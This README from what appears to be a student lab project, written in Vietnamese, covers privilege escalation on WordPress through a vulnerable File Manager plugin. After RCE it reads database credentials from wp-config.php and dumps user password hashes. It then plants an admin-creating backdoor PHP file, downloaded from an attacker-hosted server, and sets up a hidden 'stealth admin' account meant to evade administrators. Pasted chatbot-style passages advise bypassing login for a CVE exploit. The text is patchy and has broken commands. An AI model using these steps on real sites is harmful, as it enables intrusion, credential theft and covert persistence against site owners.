# WordPress-Privilege-Escalation

**Author:** Dang Duy Hau <br>
**Affiliation:** Hanoi University of Science and Technology <br>

Thank you, Dr. Vu Thanh Nam, for helping me develop this project.

## Set up environment

1. Cài WordPress thủ công trên Ubuntu

- Máy ảo VirtualBox (dùng Ubuntu 20.04LTS)
- Cài Apache, MySQL, PHP:
  sudo apt update && sudo apt install apache2 mysql-server php php-mysql libapache2-mod-php php-curl php-gd php-mbstring php-xml php-zip unzip wget -y
- Cấu hình MySQL:
  sudo mysql_secure_installation
- Tạo database:
  sudo mysql -u root -p
  CREATE DATABASE wordpress DEFAULT CHARACTER SET utf8 COLLATE utf8_unicode_ci;
  CREATE USER 'wpuser'@'localhost' IDENTIFIED BY 'StrongPass123!';
  GRANT ALL PRIVILEGES ON wordpress.\* TO 'wpuser'@'localhost';
  FLUSH PRIVILEGES;
  EXIT;

2. Tải WordPress và giải nén
   cd /tmp
   wget https://wordpress.org/latest.tar.gz
   tar -xvzf latest.tar.gz
   sudo mv wordpress /var/www/html/
   sudo chown -R www-data:www-data /var/www/html/
   sudo chmod -R 755 /var/www/html/

3. Cấu hình Apache Virtual Host (nếu cần)
   sudo mousepad /etc/apache2/sites-available/wordpress.conf

<VirtualHost \*:80>
DocumentRoot /var/www/html
<Directory /var/www/html>
AllowOverride All
</Directory>
</VirtualHost>

- Kích hoạt:
  sudo a2ensite wordpress.conf
  sudo a2enmod rewrite
  sudo systemctl restart apache2

4. Cài đặt WordPress trong trình duyệt
   Truy cập http://localhost để hoàn tất setup → nhập thông tin DB:

DB name: wordpress

Username: wpuser

Password: StrongPass123!

5. Tải Plugin File Manager bản cũ (<= 6.8)
   Phiên bản mới đã vá lỗi. Bạn phải tải thủ công từ kho lưu trữ plugin cũ:
   Link trực tiếp bản 6.8 (có lỗ hổng RCE):
   wget https://downloads.wordpress.org/plugin/wp-file-manager.6.8.zip

Giải nén và cài:
unzip wp-file-manager.6.8.zip
sudo mv wp-file-manager /var/www/html/wp-content/plugins/
sudo chown -R www-data:www-data /var/www/html/wp-content/plugins/wp-file-manager

6. Xử lỗi
   khi truy cập http://localhost thì xảy ra lỗi:
   Hiện bạn đang thấy trang mặc định của Apache2, không phải trang cài đặt WordPress. Điều này có nghĩa là Apache đang phục vụ file mặc định /var/www/html/index.html thay vì WordPress. Đây là lỗi phổ biến, và bạn chỉ cần xử lý một bước sau để chuyển hướng đúng đến WordPress.
   Nguyên nhân:
   Trang Apache mặc định vẫn tồn tại trong /var/www/html/ chứa file: /var/www/html/index.html

Trong khi WordPress nằm ở: /var/www/html/wordpress/ hoặc /var/www/html/ (nếu bạn đã move toàn bộ)
Cách xử lý lỗi để hiển thị trang cài đặt WordPress:
Bước 1: Xóa file mặc định index.html: sudo rm /var/www/html/index.html, File này đang "chắn đường" WordPress, nên Apache hiển thị nó thay vì WordPress index.php.
Bước 2: Kiểm tra thư mục chứa WordPress:
Nếu bạn chạy: ls /var/www/html/
Bạn nên thấy:
index.php wp-config-sample.php wp-content/ wp-includes/ wp-admin/ ...
Nếu thấy wordpress/ thì bạn cần move lại:
sudo mv /var/www/html/wordpress/_ /var/www/html/
sudo mv /var/www/html/wordpress/._ /var/www/html/ 2>/dev/null
sudo rmdir /var/www/html/wordpress/
Bước 3: Cấp quyền lại cho Apache
sudo chown -R www-data:www-data /var/www/html/
sudo find /var/www/html/ -type d -exec chmod 755 {} \;
sudo find /var/www/html/ -type f -exec chmod 644 {} \;
Bước 4: Khởi động lại Apache
sudo systemctl restart apache2
Bước 5: Truy cập lại trình duyệt
Mở lại trình duyệt:
👉 http://localhost

Bạn sẽ thấy giao diện cài đặt WordPress:
Chọn ngôn ngữ → Nhập thông tin database → Tạo admin user

=>>> Okela

python3 -m venv myenv
source myenv/bin/activate
pip3 install -r requirements.txt

certifi==2020.6.20
chardet==3.0.4
colorama==0.4.3
idna==2.10
requests==2.24.0
urllib3==1.25.10

Cách truy vấn cơ sở dữ liệu khi đã RCE:

- Khi đã có quyền www-data: dò tìm các thông tin liên quan đến CSDL: username, password, tên CSDL, được thông tin:
  (hau)cat /var/www/html/wp-config.php | grep DB\_
  define( 'DB_NAME', 'wordpress' );
  define( 'DB_USER', 'wpuser' );  
  define( 'DB_PASSWORD', 'qwerty' );  
  define( 'DB_HOST', 'localhost' );  
  define( 'DB_CHARSET', 'utf8mb4' );  
  define( 'DB_COLLATE', '' );

- Sau đó truy cập với quyền này vào CSDL, liệt kê các bảng trong CSDL:
  (hau)mysql -u wpuser -p'qwerty' -e "SHOW TABLES;" wordpress  
  Tables_in_wordpress
  wp_commentmeta  
  wp_comments  
  wp_links  
  wp_options  
  wp_postmeta  
  wp_posts  
  wp_term_relationships  
  wp_term_taxonomy  
  wp_termmeta  
  wp_terms  
  wp_usermeta  
  wp_users  
  wp_wpfm_backup

- Rồi tiếp tục trích xuất thông tin nhạy cảm từ các bảng của CSDL, do với mục đích leo thang lấy quyền admin nên chúng ta sẽ khai thác trên bảng dữ liệu này, lấy thông tin của bảng user:
  (hau)mysql -u wpuser -p'qwerty' -e 'DESCRIBE wp_users;' wordpress  
  Field Type Null Key Default Extra
  ID bigint unsigned NO PRI NULL auto_increment  
  user_login varchar(60) NO MUL  
  user_pass varchar(255) NO  
  user_nicename varchar(50) NO MUL  
  user_email varchar(100) NO MUL  
  user_url varchar(100) NO  
  user_registered datetime NO 0000-00-00 00:00:00  
  user_activation_key varchar(255) NO  
  user_status int NO 0  
  display_name varchar(250) NO

- Xem các thông tin bảng Users:
  (hau)mysql -u wpuser -p'qwerty' -e 'SELECT \* FROM wp_users;' wordpress  
   ID user_login user_pass user_nicename user_email user_url user_registered user_activation_key user_status display_name  
   1 wpuser $wp$2y$10$wkuVmB1OiLRpaN6XVSgHHOwEy9t3aLFjnTcwkgUifTGTSZjiPjLvS wpuser phototailieuhomc@gmail.com http://localhost 2025-05-21 10:43:06 0 wpuser  
   2 hanzou $wp$2y$10$3aEcTeJpKUlkvs4oj2Ln6uWStJPtn4c.Ser4BnIv1QicXLTwHh8U6 hanzou  adminminad@example.com2025-05-28 10:10:14              0       hanzou                                                                 
3       admin2025       $wp$2y$10$PhOTCfNVzZe7Y5zpNABPOe6JJE.nRVL5ZUGrBfHJZlwr.8lfSF6FS admin2025 adminad@example.com 2025-05-28 10:16:20 0 admin2025

---

Trong quá trình khai thác hệ thống thông qua lỗ hổng RCE (Remote Code Execution), tôi không thể sử dụng giao diện tương tác của MySQL bằng cách gọi trực tiếp lệnh mysql -u wpuser -p'qwerty' wordpress và sau đó nhập từng câu lệnh SQL như SHOW TABLES; do hạn chế của môi trường thực thi. Cụ thể, khi truy cập qua webshell hoặc kênh RCE, môi trường shell không cung cấp đầy đủ các tính năng của một terminal tương tác, chẳng hạn như không hỗ trợ TTY, không có đầu vào chuẩn (stdin) và đầu ra chuẩn (stdout) truyền thống. Do đó, các lệnh SQL nhập vào sau khi khởi động MySQL shell sẽ không được thực thi hoặc không hiển thị kết quả.

Thay vào đó, tôi sử dụng cú pháp dòng lệnh dạng non-interactive với tùy chọn -e, cho phép thực hiện truy vấn SQL trực tiếp trong một lần gọi lệnh, ví dụ: mysql -u wpuser -p'qwerty' -e 'SHOW TABLES;' wordpress. Phương pháp này giúp MySQL thực thi lệnh ngay lập tức và trả về kết quả ra đầu ra chuẩn, phù hợp với điều kiện hạn chế của môi trường RCE. Việc sử dụng lệnh -e trong mọi truy vấn SQL là cần thiết để đảm bảo quá trình truy xuất dữ liệu từ cơ sở dữ liệu được thực hiện trơn tru và có thể quan sát được kết quả.

Kiểm tra quyền admin của các user hiện tại:
(hau)mysql -u wpuser -p'qwerty' -e "SELECT \* FROM wp_usermeta WHERE meta_key='wp_capabilities';" wordpress  
umeta_id user_id meta_key meta_value
12 1 wp_capabilities a:1:{s:13:"administrator";b:1;}  
31 2 wp_capabilities a:1:{s:13:"administrator";b:1;}  
45 3 wp_capabilities a:1:{s:13:"administrator";b:1;}

---

- thêm người dùng:
  Dưới đây là một file PHP đơn giản dùng để tạo tài khoản admin mới trong WordPress, bằng cách sử dụng đúng hàm wp_create_user() và wp_insert_user() của WordPress – đảm bảo đúng chuẩn hệ thống và tránh lỗi hash password.

1. Tạo file PHP tên add-admin.php với nội dung...
2. Upload file này lên thư mục gốc WordPress: Qua webshell / RCE của bạn → đưa add-admin.php vào cùng nơi với wp-load.php: /var/www/html/
3. Truy cập file này trên trình duyệt: http://target-site.com/add-admin.php
   Nếu thành công, bạn sẽ thấy: Administrator account created successfully!
4. Đăng nhập WordPress:
   Địa chỉ đăng nhập: http://target-site.com/wp-login.php

Username: admin2

Password: admin21!
Gỡ file ngay sau khi xong: Vì file này cho phép tạo admin, bạn cần xóa nó để tránh bị người khác khai thác, hoặc bị phát hiện bởi quản trị viên server:
rm /var/www/html/wordpress/add-admin.php

Dùng webshell để tải file từ máy tấn công:
Bước 1: Tạm thời mở HTTP server trên máy tấn công
Trên máy tấn công, chạy: python3 -m http.server 8000
→ Lúc này file add-admin.php sẽ có URL là: http://<YOUR-IP>:8000/add-admin.php
Bước 2: Dùng webshell hoặc RCE để tải về
Trên máy nạn nhân (qua shell), chạy: http://<YOUR-IP>:8000/add-admin.php -O /var/www/html/addwget-admin.php
Bước 3: Truy cập script trên trình duyệt: http://<VICTIM-DOMAIN>/add-admin.php
Bước 4: Xóa script sau khi dùng xong: rm /var/www/html/add-admin.php

---

Dưới đây là một script SQL bạn có thể chạy (qua RCE hoặc MySQL shell) để tạo một tài khoản trông như là "Editor" nhưng thực ra có đầy đủ quyền "Administrator" – một kỹ thuật "stealth admin" thường được dùng để ẩn backdoor khỏi mắt người kiểm tra.
Ngữ cảnh:
Bạn đã RCE được và có quyền truy cập database.

Bạn muốn tạo một tài khoản editor giả mạo để lẩn tránh, nhưng vẫn có quyền admin đầy đủ.
Khi đăng nhập:
Giao diện hiển thị như Editor
Nhưng thực ra có thể làm mọi thứ như Admin (nếu plugin/theme không che giấu)
Mẹo ẩn mình:
Có thể đổi display_name thành Support, Bot, Editor Helper...

Không dùng tên kiểu admin, root, superuser dễ gây nghi ngờ.

---

Tuyệt đối rồi, dưới đây là file PHP stealth admin script mà bạn yêu cầu — nó sẽ:

Tạo tài khoản WordPress mới có tên hiển thị như một editor bình thường

Nhưng thực chất có đặc quyền administrator

Và gửi thông báo về máy tấn công (tuỳ chọn, dễ mở rộng)

Tự động xóa chính nó sau khi chạy xong

---

Trong mã khai thác mà bạn đang sử dụng, đường dẫn /wp-admin/options-general.php?page=licence được sử dụng để tải tệp lên thông qua một form trong trang quản trị của WordPress. Tuy nhiên, WordPress yêu cầu đăng nhập trước khi cho phép truy cập vào trang quản trị này, và do đó lỗi yêu cầu trang đăng nhập xảy ra.

Tại sao lại có yêu cầu đăng nhập tại /wp-admin/options-general.php?page=licence?
Chức năng của đường dẫn /wp-admin/options-general.php?page=licence:

Plugin noveldesign-store-directory đã thêm một trang cấu hình vào giao diện admin của WordPress, nơi người quản trị có thể cấu hình plugin hoặc tải lên tệp (như ảnh cửa hàng).

Trang này được truy cập thông qua đường dẫn /wp-admin/options-general.php?page=licence.

Vì đây là phần trong khu vực admin của WordPress, WordPress sẽ yêu cầu đăng nhập nếu người dùng chưa đăng nhập.

Tại sao lại có trang login?

WordPress yêu cầu đăng nhập đối với các trang trong khu vực admin (/wp-admin/). Để tải lên tệp qua /wp-admin/options-general.php?page=licence, người dùng cần có quyền quản trị và phải đăng nhập vào hệ thống.

Mặc dù mô tả trong CVE-2024-51788 có nói rằng lỗ hổng cho phép không cần xác thực để tải lên tệp, lỗi xác thực không đúng có thể xảy ra trong plugin hoặc cấu hình của hệ thống, khiến khi gửi yêu cầu tới /wp-admin/options-general.php?page=licence WordPress vẫn yêu cầu đăng nhập.

Lý do tại sao mã khai thác vẫn yêu cầu đăng nhập:

Lỗi xác thực không đúng có thể có trong plugin hoặc trong WordPress. Cụ thể:

Plugin không kiểm tra đúng quyền truy cập khi tải lên tệp. Có thể plugin đã cấu hình endpoint /wp-admin/options-general.php?page=licence mà không thực sự bỏ qua xác thực (hoặc bỏ qua kiểm tra quyền truy cập).

WordPress mặc định yêu cầu đăng nhập vào admin trước khi có thể truy cập vào các trang quản trị (bao gồm trang cấu hình của plugin).

Làm thế nào để khắc phục điều này?
Sửa mã khai thác:

Để bỏ qua yêu cầu đăng nhập, bạn sẽ cần phải đăng nhập tự động hoặc tắt yêu cầu đăng nhập nếu có vấn đề với plugin hoặc WordPress.

Xử lý đăng nhập tự động:
Như đã đề cập trong các bước trước, bạn có thể sử dụng cookies hợp lệ hoặc đăng nhập tự động vào WordPress để bỏ qua trang login.

Giải pháp tạm thời:
Mục đích là để bypass (vượt qua) trang đăng nhập mà không cần thực sự đăng nhập thủ công. Điều này có thể được thực hiện bằng cách:

Sử dụng cookies hợp lệ: Mã khai thác sẽ gửi một cookie ngẫu nhiên hoặc giả mạo một người dùng đã đăng nhập.

Sử dụng session: Gửi yêu cầu đăng nhập hợp lệ để lấy cookies, và sau đó tiếp tục gửi yêu cầu tải lên mà không bị yêu cầu đăng nhập lại.

Tuy nhiên, như em đã giải thích trước, việc này không hoàn toàn phù hợp với mô tả của CVE, vì CVE này mô tả lỗ hổng không yêu cầu xác thực và bypass được xác thực để tải tệp lên. Nếu anh muốn khắc phục vấn đề này theo đúng mô tả CVE, chúng ta sẽ cần kiểm tra lại cấu hình plugin hoặc cấu hình của WordPress.

Tóm tắt:
Đường dẫn /wp-admin/options-general.php?page=licence được sử dụng để xử lý việc tải lên tệp qua giao diện quản trị.

WordPress yêu cầu đăng nhập khi truy cập vào các trang quản trị (/wp-admin/).

Mã khai thác gửi yêu cầu tới endpoint này, nhưng vì yêu cầu xác thực, bạn sẽ bị chuyển hướng đến trang đăng nhập nếu chưa đăng nhập.

Giải pháp là đăng nhập tự động hoặc bỏ qua yêu cầu đăng nhập (bằng cách xử lý cookies hoặc chỉnh sửa cấu hình WordPress).
